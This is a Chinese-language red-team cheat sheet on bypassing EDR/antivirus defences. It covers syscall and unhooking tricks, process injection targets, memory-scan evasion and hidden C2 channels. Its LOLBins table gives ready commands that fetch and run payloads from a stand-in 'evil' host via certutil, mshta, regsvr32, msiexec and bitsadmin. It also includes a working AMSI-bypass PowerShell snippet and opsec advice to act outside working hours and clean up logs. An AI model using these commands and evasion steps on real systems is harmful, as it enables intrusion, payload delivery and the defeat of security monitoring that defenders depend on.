# EDR/AV 绕过与隐蔽操作速查

> 来源：多个红队实战经验总结（2024-2026）
> 适用场景：需要在有 EDR/AV 防护的环境中执行操作时参考

---

## 检测层与对应绕过

| 检测层 | EDR 做什么 | 绕过思路 |
|--------|-----------|---------|
| 静态签名 | 匹配已知恶意文件 hash/特征 | 自定义编译、加密 payload、修改特征 |
| 用户态 Hook | Hook ntdll.dll 监控 API 调用 | 直接系统调用 / Unhooking / 自带 ntdll |
| 内核回调 | 注册进程/线程/镜像加载回调 | 回调移除（需要驱动）/ 合法进程注入 |
| ETW | 通过 ETW 收集事件 | Patch EtwEventWrite / 禁用 provider |
| 行为分析 | 分析调用序列和行为模式 | 延迟执行 / 分散操作 / 模拟正常行为 |
| 内存扫描 | 定期扫描进程内存 | 堆加密 / Sleep 时加密 payload / 模块踩踏 |
| 网络检测 | 分析出站流量特征 | 域前置 / 合法服务隧道 / 加密 |

---

## 实用绕过技术

### 1. 直接系统调用（绕过用户态 Hook）

```
原理：不通过 ntdll.dll，直接用 syscall 指令调用内核
工具：SysWhispers3 / HellsGate / TartarusGate
效果：绕过所有用户态 Hook
```

### 2. Unhooking（恢复原始 ntdll）

```
方法 A：从磁盘重新映射 ntdll.dll
方法 B：从 KnownDlls 目录加载干净副本
方法 C：从挂起的进程中复制 .text 段
效果：恢复被 Hook 的 API 到原始状态
```

### 3. 进程注入（选择低监控目标）

```
推荐注入目标（低监控）：
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe（风险稍高）

避免注入：
- lsass.exe（高度监控）
- svchost.exe（部分 EDR 重点关注）
- powershell.exe / cmd.exe
```

### 4. 模块踩踏（Module Stomping）

```
原理：将 payload 写入已加载的合法 DLL 的 .text 段
效果：内存扫描时看到的是合法模块，不是可疑的 RWX 内存
```

### 5. Sleep 加密（Ekko/Zilean）

```
原理：beacon sleep 期间加密自身内存
效果：内存扫描时找不到 payload 特征
实现：注册 Timer 回调，sleep 前加密，唤醒后解密
```

### 6. 调用栈欺骗（Call Stack Spoofing）

```
原理：伪造调用栈，使 API 调用看起来来自合法代码
效果：绕过基于调用栈的行为检测
```

---

## C2 流量隐蔽

| 技术 | 原理 | 检测难度 |
|------|------|---------|
| 域前置 | HTTPS 请求的 SNI 和 Host 头不同 | 高 |
| Cloudflare Workers | 通过 CF 中转，看起来是正常 HTTPS | 高 |
| Azure/AWS 合法服务 | 利用云服务 API 做 C2 通道 | 极高 |
| DNS over HTTPS | C2 数据编码在 DNS 查询中 | 中 |
| WebSocket | 长连接，混入正常 Web 流量 | 中 |
| ICMP 隧道 | 数据藏在 ICMP 包中 | 低（容易被发现） |

---

## LOLBins（Living Off the Land）

利用系统自带的合法程序执行恶意操作：

| 程序 | 用途 | 命令示例 |
|------|------|---------|
| certutil | 下载文件 | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | 执行 HTA | `mshta http://evil/payload.hta` |
| rundll32 | 加载 DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | 加载 SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | 远程执行 | `wmic /node:target process call create "cmd"` |
| msiexec | 安装 MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | 下载文件 | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | 执行命令 | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI 绕过（PowerShell）

```powershell
# 经典 Patch（可能被签名检测）
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 更隐蔽的方式：反射修改 AmsiScanBuffer
# 或使用 PowerShell 降级到 v2（无 AMSI）
powershell -version 2
```

---

## 操作安全（OpSec）原则

1. **最小动作原则** — 能不碰的不碰，能用已有凭据的不新建
2. **时间窗口** — 在目标非工作时间操作（减少人工审查概率）
3. **流量混入** — C2 通信频率和大小模拟正常业务流量
4. **工具不落盘** — 内存执行，用完即清
5. **日志意识** — 知道哪些操作会产生什么日志，提前规避或事后清理
6. **蜜罐识别** — 操作前先识别蜜罐（异常开放的服务、过于诱人的凭据）
7. **分段操作** — 不要一次性完成所有步骤，分散在多个时间段
